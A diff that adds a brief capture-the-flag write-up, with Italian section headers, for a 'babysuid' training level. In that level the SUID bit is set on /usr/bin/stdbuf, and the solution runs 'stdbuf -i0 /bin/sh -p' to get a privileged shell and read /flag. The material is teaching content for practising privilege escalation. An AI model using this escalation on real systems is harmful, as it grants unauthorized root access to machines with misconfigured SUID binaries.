@@ -1,0 +1,18 @@
+//TESTO
+
+hacker@babysuid_level29:~$ /challenge/babysuid_level29 
+Welcome to /challenge/babysuid_level29!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/stdbuf.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (/challenge/babysuid_level29) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf!
+
+//SOLUZIONE
+
+hacker@babysuid_level29:~$ stdbuf -i0 /bin/sh -p
+# cat /flag
